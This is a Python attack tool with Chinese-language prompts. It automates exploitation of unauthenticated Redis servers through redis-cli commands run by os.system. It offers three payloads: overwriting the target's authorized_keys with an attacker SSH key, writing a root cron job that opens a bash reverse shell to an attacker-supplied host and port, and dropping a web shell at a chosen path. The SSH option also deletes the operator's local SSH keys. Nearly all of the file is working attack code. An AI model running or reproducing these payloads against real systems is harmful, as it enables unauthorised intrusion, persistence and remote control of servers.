#@author:九世
#@time:2019/12/26
#@file:attack.py

from colorama import Fore,init
import os

init(wrap=True)

class Attack:
    def __init__(self):
        self.banner=r'''
 ________  _______   ________  ___  ________   ________  _________  _________  ________  ________  ___  __       
|\   __  \|\  ___ \ |\   ___ \|\  \|\   ____\ |\   __  \|\___   ___\\___   ___\\   __  \|\   ____\|\  \|\  \     
\ \  \|\  \ \   __/|\ \  \_|\ \ \  \ \  \___|_\ \  \|\  \|___ \  \_\|___ \  \_\ \  \|\  \ \  \___|\ \  \/  /|_   
 \ \   _  _\ \  \_|/_\ \  \ \\ \ \  \ \_____  \\ \   __  \   \ \  \     \ \  \ \ \   __  \ \  \    \ \   ___  \  
  \ \  \\  \\ \  \_|\ \ \  \_\\ \ \  \|____|\  \\ \  \ \  \   \ \  \     \ \  \ \ \  \ \  \ \  \____\ \  \\ \  \ 
   \ \__\\ _\\ \_______\ \_______\ \__\____\_\  \\ \__\ \__\   \ \__\     \ \__\ \ \__\ \__\ \_______\ \__\\ \__\
    \|__|\|__|\|_______|\|_______|\|__|\_________\\|__|\|__|    \|__|      \|__|  \|__|\|__|\|_______|\|__| \|__|
                                      \|_________|                                                               
        
* ID1 写入ssh key
* ID2 反弹shell
* ID3 尝试写入web shell
        '''
        print(self.banner)
        #ssh write key
        self.payload='''rm -rf ~/.ssh/id*|ssh-keygen -t rsa|(echo -e "\\n\\n";cat ~/.ssh/id_rsa.pub;echo -e "\\n\\n") > foo.txt|redis-cli -h {ip} flushall|cat foo.txt haq redis-cli -h {ip} -x set crackit|redis-cli -h {ip} config set dir /var/lib/redis/.ssh/|redis-cli -h {ip} config set dbfilename "authorized_keys"|redis-cli -h {ip} save|ssh -i /root/.ssh/id_rsa redis@{ip}'''
        #bash shell
        self.payload2='redis-cli -h {ip} set x "\\n* * * * * bash -i >& /dev/tcp/{ip2}/{port} 0>&1\\n"|redis-cli -h {ip} config set dir /var/spool/cron/|redis-cli -h {ip} config set dbfilename root|redis-cli -h {ip} save'
        #write shell
        self.payload3='redis-cli -h {ip} config set dir {path}|redis-cli -h {ip} config set dbfilename {name}|redis-cli -h {ip} set x "{payload}"|redis-cli -h {ip} save'

    def zhix(self,id):
        if id=='1':
            rhost=input(Fore.WHITE + '(' + Fore.RED + 'RHOST' + Fore.WHITE + '>)')
            print('RHOST=>{}'.format(rhost))
            data=self.payload.split('|')
            for d in data:
                os.system(str(d).format(ip=rhost).replace('haq','|'))
        elif id=='2':
            print(Fore.YELLOW+"[!] "+Fore.WHITE+"请在本机监听对应的端口")
            rhost = input(Fore.WHITE + '(' + Fore.RED + 'RHOST' + Fore.WHITE + '>)')
            print('RHOST=>{}'.format(rhost))
            lhost = input(Fore.WHITE + '(' + Fore.RED + 'LHOST' + Fore.WHITE + '>)')
            print('LHOST=>{}'.format(lhost))
            lport = input(Fore.WHITE + '(' + Fore.RED + 'LPORT' + Fore.WHITE + '>)')
            print('LPORT=>{}'.format(lport))
            data=self.payload2.split('|')
            for x in data:
                os.system(x.format(ip=rhost,ip2=lhost,port=lport))

        elif id=='3':
            rhost = input(Fore.WHITE + '(' + Fore.RED + 'RHOST' + Fore.WHITE + '>)')
            print('RHOST=>{}'.format(rhost))
            path = input(Fore.WHITE + '(' + Fore.RED + 'PATH' + Fore.WHITE + '>)')
            print('PATH=>{}'.format(path))
            name = input(Fore.WHITE + '(' + Fore.RED + '(SHELL)FILE_NAME' + Fore.WHITE + '>)')
            print('name=>{}'.format(name))
            payload = input(Fore.WHITE + '(' + Fore.RED + 'PAYLOAD' + Fore.WHITE + '>)')
            print('PAYLOAD=>{}'.format(payload))
            data = self.payload3.split('|')
            for p in data:
                os.system(str(p).format(ip=rhost,path=path,name=name,payload=payload))

if __name__ == '__main__':
    obj=Attack()
    if os.path.exists('/usr/bin/redis-cli')==True:
        print(Fore.BLUE+'[+] '+Fore.WHITE+'已检测到redis-cli')
        xw=input(Fore.WHITE+'('+Fore.RED+'ID'+Fore.WHITE+'>)')
        print('ID=>{}'.format(xw))
        obj.zhix(xw)
    else:
        print(Fore.YELLOW+'[!] '+Fore.WHITE+'检测不到redis-cli,请将redis-cli设置到/usr/bin路径')
        exit()